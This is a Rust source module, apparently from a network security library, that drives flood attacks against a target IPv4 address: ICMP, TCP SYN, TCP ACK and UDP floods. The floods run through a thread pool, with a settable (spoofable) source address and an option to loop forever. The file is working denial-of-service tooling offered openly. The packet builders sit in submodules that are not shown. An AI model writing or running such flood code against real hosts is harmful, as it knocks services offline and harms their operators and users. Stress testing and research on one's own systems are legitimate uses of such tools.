use anyhow::Result;
use std::net::Ipv4Addr;

pub mod icmp;
pub mod tcp;
pub mod udp;

use crate::utils;

pub const ICMP_BUFF_SIZE: usize = 4096;
pub const TCP_BUFF_SIZE: usize = 4096;
pub const IPV4_HEADER_LEN: usize = 20;
pub const ICMP_HEADER_LEN: usize = 8;
pub const ICMP_DATA_LEN: usize = 0;
pub const TCP_HEADER_LEN: usize = 20;
pub const TCP_DATA_LEN: usize = 0;
pub const IP_TTL: u8 = 64;

enum FloodMethods {
    Icmp,
    Syn,
    Ack,
    Udp,
}

fn _run_flood(
    method: FloodMethods,
    src_ipv4: Option<Ipv4Addr>,
    src_port: Option<u16>,
    dst_ipv4: Ipv4Addr,
    dst_port: Option<u16>,
    interface: Option<&str>,
    threads_num: usize,
    print_result: bool,
    max_same_packet: usize,
    max_flood_packet: usize,
) -> Result<()> {
    let src_ipv4 = if src_ipv4.is_none() {
        let (_, src_ipv4, _) = utils::parse_interface(interface)?;
        src_ipv4
    } else {
        src_ipv4.unwrap()
    };

    let src_port = if src_port.is_none() {
        utils::random_port()
    } else {
        src_port.unwrap()
    };

    let dst_port = if dst_port.is_none() {
        utils::random_port()
    } else {
        dst_port.unwrap()
    };

    let func = match method {
        FloodMethods::Icmp => icmp::send_icmp_flood_packet,
        FloodMethods::Syn => tcp::send_syn_flood_packet,
        FloodMethods::Ack => tcp::send_ack_flood_packet,
        FloodMethods::Udp => udp::send_udp_flood_packet,
    };

    let pool = utils::get_threads_pool(threads_num);

    if max_flood_packet > 0 {
        for loop_num in 0..max_flood_packet {
            if print_result {
                if loop_num % 10000 == 0 {
                    println!("send {loop_num} packet");
                }
            }
            pool.execute(move || {
                let _ = func(src_ipv4, src_port, dst_ipv4, dst_port, max_same_packet);
            });
        }
    } else {
        let mut loop_num = 0;
        loop {
            loop_num += 1;
            if print_result {
                if loop_num % 10000 == 0 {
                    println!("send {loop_num} packet");
                }
            }
            pool.execute(move || {
                let _ = func(src_ipv4, src_port, dst_ipv4, dst_port, max_same_packet);
            });
        }
    }

    Ok(())
}

pub fn icmp_flood_host(
    src_ipv4: Option<Ipv4Addr>,
    dst_ipv4: Ipv4Addr,
    interface: Option<&str>,
    threads_num: usize,
    print_result: bool,
    max_same_packet: usize,
    max_flood_packet: usize,
) -> Result<()> {
    _run_flood(
        FloodMethods::Icmp,
        src_ipv4,
        Some(0),
        dst_ipv4,
        Some(0),
        interface,
        threads_num,
        print_result,
        max_same_packet,
        max_flood_packet,
    )
}

pub fn tcp_syn_flood_host(
    src_ipv4: Option<Ipv4Addr>,
    src_port: Option<u16>,
    dst_ipv4: Ipv4Addr,
    dst_port: Option<u16>,
    interface: Option<&str>,
    threads_num: usize,
    print_result: bool,
    max_same_packet: usize,
    max_flood_packet: usize,
) -> Result<()> {
    _run_flood(
        FloodMethods::Syn,
        src_ipv4,
        src_port,
        dst_ipv4,
        dst_port,
        interface,
        threads_num,
        print_result,
        max_same_packet,
        max_flood_packet,
    )
}

pub fn tcp_ack_flood_host(
    src_ipv4: Option<Ipv4Addr>,
    src_port: Option<u16>,
    dst_ipv4: Ipv4Addr,
    dst_port: Option<u16>,
    interface: Option<&str>,
    threads_num: usize,
    print_result: bool,
    max_same_packet: usize,
    max_flood_packet: usize,
) -> Result<()> {
    _run_flood(
        FloodMethods::Ack,
        src_ipv4,
        src_port,
        dst_ipv4,
        dst_port,
        interface,
        threads_num,
        print_result,
        max_same_packet,
        max_flood_packet,
    )
}

pub fn udp_flood_host(
    src_ipv4: Option<Ipv4Addr>,
    src_port: Option<u16>,
    dst_ipv4: Ipv4Addr,
    dst_port: Option<u16>,
    interface: Option<&str>,
    threads_num: usize,
    print_result: bool,
    max_same_packet: usize,
    max_flood_packet: usize,
) -> Result<()> {
    _run_flood(
        FloodMethods::Udp,
        src_ipv4,
        src_port,
        dst_ipv4,
        dst_port,
        interface,
        threads_num,
        print_result,
        max_same_packet,
        max_flood_packet,
    )
}
